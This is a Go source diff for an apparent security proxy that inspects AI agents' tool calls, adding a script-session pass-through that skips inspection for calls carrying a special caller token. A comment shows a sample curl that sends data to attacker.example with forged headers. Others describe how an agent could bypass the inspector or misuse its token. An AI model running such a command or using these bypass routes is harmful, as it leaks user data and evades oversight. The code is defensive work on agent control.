@@ -7,9 +7,12 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"strconv"
 	"strings"
 	"time"
+
+	"mvdan.cc/sh/v3/syntax"
 
 	"github.com/clawvisor/clawvisor/internal/runtime/conversation"
 	"github.com/clawvisor/clawvisor/internal/runtime/llmproxy/inspector"
@@ -774,6 +777,38 @@ func newToolUseEvaluator(req *http.Request, cfg PostprocessConfig, provider conv
 			}
 		}
 
+		// Script-session pass-through: when the agent has already
+		// minted a script session and embedded its caller token in the
+		// tool_use (cv-script-…), the call is already shaped for our
+		// proxy — the URL points at our base_url, the autovault
+		// placeholder is in Authorization, and the script-session
+		// token is in X-Clawvisor-Caller. Re-running the inspector
+		// pipeline here would try to "rewrite" an already-rewritten
+		// curl, fail with ErrNoRewriter, and block a workflow the
+		// agent did exactly right.
+		//
+		// The gate requires BOTH a cv-script-prefixed token in a
+		// recognized X-Clawvisor-Caller header position AND the URL
+		// pointing at our resolver host. The URL check matters
+		// independently: without it, a tool_use of
+		//   `curl https://attacker.example -d "$DATA" \
+		//     -H 'X-Clawvisor-Caller: Bearer cv-script-anything' \
+		//     -H 'Authorization: Bearer autovault_x'`
+		// would also pass the header pattern and bypass the inspector
+		// (no rewrite, no boundary check, no task-scope evaluation,
+		// no egress filtering) on its way to an off-proxy URL. The
+		// resolver's own validation only fires when the call reaches
+		// the resolver; an off-proxy bypass never does.
+		if scriptSessionToolUse(tu.Input, cfg.RewriteOpts.ResolverBaseURL) {
+			audit("allow", "script_session_passthrough", "tool_use carries a script-session caller token; resolver enforces scope")
+			trace(TraceEventDecision,
+				"path", "script_session_passthrough",
+				"kind", "allow",
+				"source", "script_session",
+			)
+			return conversation.ToolUseVerdict{Allowed: true}
+		}
+
 		v = cfg.Inspector.Inspect(req.Context(), inspector.ToolUse{
 			ID:    tu.ID,
 			Name:  tu.Name,
@@ -1168,7 +1203,11 @@ func credentialedRewriteRecoveryReason(v inspector.Verdict, err error) string {
 	if err == nil {
 		return "Clawvisor: rewriter refused"
 	}
-	if strings.Contains(err.Error(), "no rewriter for tool input shape") {
+	// Sentinel match — the inspector package owns the canonical error
+	// value, so substring matching on err.Error() would silently break
+	// if the message text ever changes. errors.Is is the durable
+	// boundary.
+	if errors.Is(err, inspector.ErrNoRewriter) {
 		var b strings.Builder
 		b.WriteString("Clawvisor: detected credentialed API access, but this tool shape cannot be rewritten. ")
 		b.WriteString("Detected ")
@@ -1183,7 +1222,35 @@ func credentialedRewriteRecoveryReason(v inspector.Verdict, err error) string {
 		if len(v.CredentialLocations) > 0 || len(v.Placeholders) > 0 {
 			b.WriteString(" using an autovault placeholder")
 		}
-		b.WriteString(". Retry as one credentialed curl per tool_use; for multiple requests, emit multiple parallel tool_uses instead of a Python, Node, heredoc, or shell-loop script.")
+		b.WriteString(". Recover by minting a script session: POST ")
+		b.WriteString("https://" + ControlSyntheticHost + ControlSyntheticPath + "/autovault/script-session")
+		// Build the example with placeholder text when the verdict's
+		// host/method are unknown — otherwise the example would
+		// render as `target_host, methods:[]` which isn't a valid
+		// shape and would mislead the agent on the field format.
+		host := v.Host
+		if host == "" {
+			host = "<target host>"
+		}
+		method := v.Method
+		if method == "" {
+			method = "GET"
+		}
+		b.WriteString(" with `{placeholder, target_host:\"")
+		b.WriteString(host)
+		b.WriteString("\", methods:[\"")
+		b.WriteString(method)
+		b.WriteString("\"], path_prefixes:[<service-specific prefix covering ")
+		if v.Path != "" {
+			b.WriteString(v.Path)
+		} else {
+			b.WriteString("the requests you are making")
+		}
+		b.WriteString(">], max_uses, ttl_seconds, why}` (hard limits: TTL ≤ 120s, max_uses ≤ 200, GET-only initially). ")
+		b.WriteString("Then from your script call `base_url + <upstream path>` with `X-Clawvisor-Caller: Bearer <caller_token>` and `Authorization: Bearer <placeholder>` on each request. ")
+		b.WriteString("See GET ")
+		b.WriteString("https://" + ControlSyntheticHost + ControlSyntheticPath + "/autovault/script")
+		b.WriteString(" for the full request shape and error recovery codes.")
 		return b.String()
 	}
 	return "Clawvisor: rewriter refused — " + err.Error()
@@ -2194,3 +2261,306 @@ func firstNonEmpty(values ...string) string {
 	}
 	return ""
 }
+
+// scriptSessionToolUse reports whether a tool_use input looks like a
+// legitimate script-session call: a curl (or structured tool_use) that
+// carries a cv-script-prefixed caller token AND targets our resolver
+// mount. When true the inspector is skipped — the resolver enforces
+// session scope on every actual request.
+//
+// The threat model accepts that the AGENT could construct mischief
+// with their cv-script token (use --proxy attacker, pipe to a remote
+// sink, etc.). The mitigation for that lives at the mint-time intent
+// verifier, which evaluates the agent's stated `why` against the
+// task's purpose before issuing the token, and the resolver, which
+// enforces scope on every actual request. Parser-level checks on the
+// agent's curl shape (single-curl-only, no variable expansion, flag
+// allowlists) don't add real defense — the agent could use any of
+// python/node/perl/etc. to achieve the same effect, and the parser
+// only knows curl. The asymmetry was creating friction (rejecting
+// legitimate `while read id; do curl …/${id}; done` loops) without a
+// matching security benefit.
+//
+// What this function still enforces:
+//   - a cv-script-prefixed token must appear at the X-Clawvisor-Caller
+//     header position (so we don't skip the inspector on a tool_use
+//     that merely mentions the prefix in a string literal), AND
+//   - at least one curl URL literal prefix must target our resolver
+//     mount (host:port + path-prefix, with traversal rejection). This
+//     is recognition, not enforcement: if the URL doesn't look like
+//     ours, we let the inspector run as usual; we're not claiming the
+//     call is safe.
+//
+// resolverBaseURL is the proxy's /api/proxy mount (e.g.
+// "http://localhost:25297/api/proxy"). Empty disables passthrough.
+func scriptSessionToolUse(input json.RawMessage, resolverBaseURL string) bool {
+	if len(input) == 0 || resolverBaseURL == "" {
+		return false
+	}
+	proxyHost, proxyPath := resolverPassthroughTarget(resolverBaseURL)
+	if proxyHost == "" {
+		return false
+	}
+	var raw struct {
+		Headers map[string]json.RawMessage `json:"headers,omitempty"`
+		URL     string                     `json:"url,omitempty"`
+		Cmd     string                     `json:"cmd,omitempty"`
+		Command string                     `json:"command,omitempty"`
+	}
+	if err := json.Unmarshal(input, &raw); err != nil {
+		return false
+	}
+	// Structured tool shape: top-level `url` + `headers` map.
+	if headerHasScriptSessionToken(raw.Headers) && urlTargetsResolver(raw.URL, proxyHost, proxyPath) {
+		return true
+	}
+	// Bash/exec shape: walk the parsed cmd for any curl invocation
+	// with a cv-script caller header AND a URL whose literal prefix
+	// targets our resolver mount. Variable expansion after the
+	// literal prefix is fine — the resolver enforces scope on the
+	// actual expanded URL. Pipelines, multi-statement scripts,
+	// redirects, and additional shell wrappers are all allowed; the
+	// resolver is the perimeter.
+	cmd := raw.Cmd
+	if cmd == "" {
+		cmd = raw.Command
+	}
+	if cmd == "" {
+		return false
+	}
+	urls, headers := extractCurlIntent(cmd)
+	if len(urls) == 0 || len(headers) == 0 {
+		return false
+	}
+	if !headerValuesHaveScriptSessionToken(headers) {
+		return false
+	}
+	for _, u := range urls {
+		if urlTargetsResolver(u, proxyHost, proxyPath) {
+			return true
+		}
+	}
+	return false
+}
+
+// headerValuesHaveScriptSessionToken reports whether any
+// X-Clawvisor-Caller header value (any form: `-H Name: value`,
+// `--header Name: value`, `--header=Name: value`) carries a
+// script-session token.
+func headerValuesHaveScriptSessionToken(headers []string) bool {
+	for _, h := range headers {
+		name, value, ok := splitHeaderArg(h)
+		if !ok {
+			continue
+		}
+		if !strings.EqualFold(name, "X-Clawvisor-Caller") {
+			continue
+		}
+		if hasScriptSessionToken(value) {
+			return true
+		}
+	}
+	return false
+}
+
+// splitHeaderArg parses a curl -H/--header value of the form
+// "Name: value" into (name, value, true). Returns false on shapes
+// that don't fit (no colon, empty name).
+func splitHeaderArg(raw string) (name, value string, ok bool) {
+	i := strings.IndexByte(raw, ':')
+	if i <= 0 {
+		return "", "", false
+	}
+	return strings.TrimSpace(raw[:i]), strings.TrimSpace(raw[i+1:]), true
+}
+
+// extractCurlIntent walks a bash command's AST for ANY curl invocation
+// (across pipelines, multi-statement scripts, subshells, while-loops,
+// etc.) and returns the URL literal-prefixes + -H/--header values it
+// finds. "Literal prefix" means the leading static portion of each
+// arg — variable expansion, command substitution, etc. just cut the
+// prefix short rather than disqualify the arg.
+//
+// Best-effort by design: this is recognition for the script-session
+// passthrough, not security enforcement. The mint-time intent verifier
+// and the resolver's per-request scope check are the actual gates;
+// this function only decides "does this tool_use look like a legit
+// script-session call to our resolver, so we can skip the inspector?"
+//
+// Parse errors return empty slices — caller treats that as "no match,"
+// and the inspector runs as usual.
+func extractCurlIntent(cmd string) (urls []string, headers []string) {
+	file, err := syntax.NewParser().Parse(strings.NewReader(cmd), "")
+	if err != nil {
+		return nil, nil
+	}
+	syntax.Walk(file, func(node syntax.Node) bool {
+		call, ok := node.(*syntax.CallExpr)
+		if !ok || len(call.Args) == 0 {
+			return true
+		}
+		// Extract from any CallExpr's args — not just ones where
+		// the head is "curl". Real script patterns wrap curl in
+		// xargs / parallel / find -exec / shell functions, all of
+		// which put "curl" somewhere other than args[0]. As long
+		// as a URL targeting our resolver and a cv-script -H both
+		// appear in the same arg list, recognition is fine — the
+		// resolver still enforces on the actual request.
+		extractFromCurlArgs(call.Args, &urls, &headers)
+		return true
+	})
+	return urls, headers
+}
+
+// extractFromCurlArgs collects URL literal-prefixes and -H/--header
+// values from a single curl call's arg list. It handles space-
+// separated (`-H "X: y"`) and equals-attached (`--header=X: y`) forms
+// for headers, and treats any non-flag positional starting with
+// http:// or https:// as a URL.
+func extractFromCurlArgs(args []*syntax.Word, urls, headers *[]string) {
+	for i := 0; i < len(args); i++ {
+		prefix := shellWordLiteralPrefix(args[i])
+
+		// `--header=value` / `--url=value` form: literal prefix
+		// includes the flag name + `=` + the start of the value.
+		if strings.HasPrefix(prefix, "--header=") {
+			*headers = append(*headers, prefix[len("--header="):])
+			continue
+		}
+		if strings.HasPrefix(prefix, "--url=") {
+			candidate := prefix[len("--url="):]
+			if strings.HasPrefix(candidate, "http://") || strings.HasPrefix(candidate, "https://") {
+				*urls = append(*urls, candidate)
+			}
+			continue
+		}
+
+		// Flag-then-value form: `-H value`, `--header value`,
+		// `--url value`. Only headers + url need value capture;
+		// other flags are ignored.
+		if prefix == "-H" || prefix == "--header" {
+			if i+1 < len(args) {
+				*headers = append(*headers, shellWordLiteralPrefix(args[i+1]))
+				i++
+			}
+			continue
+		}
+		if prefix == "--url" {
+			if i+1 < len(args) {
+				candidate := shellWordLiteralPrefix(args[i+1])
+				if strings.HasPrefix(candidate, "http://") || strings.HasPrefix(candidate, "https://") {
+					*urls = append(*urls, candidate)
+				}
+				i++
+			}
+			continue
+		}
+
+		// Any other flag — skip without value capture. We
+		// deliberately don't track flag-arity for non-header/url
+		// flags; over-capturing a "value" as a URL is fine because
+		// the http:// / https:// prefix check filters it out, and
+		// over-capturing a value as a separate arg is harmless
+		// since we don't enforce anything about extra args.
+		if strings.HasPrefix(prefix, "-") {
+			continue
+		}
+
+		// Positional. If it parses as a URL, record the literal
+		// prefix — enough for urlTargetsResolver to confirm the
+		// resolver host + path-prefix even when a suffix like
+		// `${id}` expands at runtime.
+		if strings.HasPrefix(prefix, "http://") || strings.HasPrefix(prefix, "https://") {
+			*urls = append(*urls, prefix)
+		}
+	}
+}
+
+// resolverPassthroughTarget returns the (host:port, path-prefix) pair
+// we require passthrough curls to target. Empty host disables
+// passthrough — the caller should treat that as "no match." The path
+// prefix has any trailing slash stripped so the urlTargetsResolver
+// caller can apply its own "/"-or-exact-equality boundary rule.
+func resolverPassthroughTarget(baseURL string) (host, pathPrefix string) {
+	u, err := url.Parse(strings.TrimSpace(baseURL))
+	if err != nil {
+		return "", ""
+	}
+	return u.Host, strings.TrimRight(u.Path, "/")
+}
+
+// headerHasScriptSessionToken reports whether the JSON-decoded headers
+// map carries a ScriptSession-shaped value at X-Clawvisor-Caller.
+func headerHasScriptSessionToken(headers map[string]json.RawMessage) bool {
+	for k, v := range headers {
+		if !strings.EqualFold(k, "X-Clawvisor-Caller") {
+			continue
+		}
+		var val string
+		if err := json.Unmarshal(v, &val); err != nil {
+			continue
+		}
+		if hasScriptSessionToken(val) {
+			return true
+		}
+	}
+	return false
+}
+
+// urlTargetsResolver reports whether the URL points at our resolver:
+// host:port matches AND the path falls under the resolver mount
+// (e.g. "/api/proxy"). Path-prefix matching matters because a
+// host-only check would let the passthrough fire for
+// http://proxy-host/admin/whatever — same host, but the agent's curl
+// would skip the inspector while routing somewhere that isn't the
+// resolver at all. Empty / unparseable URLs are not matches.
+//
+// The boundary rule is "exact prefix or prefix + '/'", so
+// "/api/proxy/foo" matches but "/api/proxyfoo" does NOT. An empty
+// pathPrefix degenerates to "any path on the host", which is the
+// correct behavior when the configured resolver base has no path
+// component.
+func urlTargetsResolver(rawURL, proxyHost, pathPrefix string) bool {
+	if rawURL == "" || proxyHost == "" {
+		return false
+	}
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return false
+	}
+	if !strings.EqualFold(u.Host, proxyHost) {
+		return false
+	}
+	// Reject traversal-shaped paths BEFORE the prefix check. A literal
+	// "/api/proxy/../admin/x" satisfies HasPrefix on "/api/proxy/" but
+	// resolves to "/admin/x" after server-side normalization — so the
+	// passthrough would skip the inspector for a URL that doesn't
+	// actually hit the resolver. Percent-encoded forms (%2e%2e, etc.)
+	// matter for downstream decoders that normalize differently than
+	// net/url; checking EscapedPath catches both shapes.
+	if pathHasTraversal(u.Path) || pathHasTraversal(u.EscapedPath()) {
+		return false
+	}
+	if pathPrefix == "" {
+		return true
+	}
+	p := u.Path
+	if p == pathPrefix {
+		return true
+	}
+	return strings.HasPrefix(p, pathPrefix+"/")
+}
+
+// hasScriptSessionToken reports whether v is a script-session caller-
+// auth value: a ScriptSessionPrefix-prefixed token, optionally wrapped
+// in `Bearer ` (case-sensitive — Anthropic + OpenAI both use that
+// exact casing, and we don't want to encourage weirder forms).
+func hasScriptSessionToken(v string) bool {
+	v = strings.TrimSpace(v)
+	const bearer = "Bearer "
+	if strings.HasPrefix(v, bearer) {
+		v = strings.TrimSpace(v[len(bearer):])
+	}
+	return strings.HasPrefix(v, ScriptSessionPrefix)
+}
+
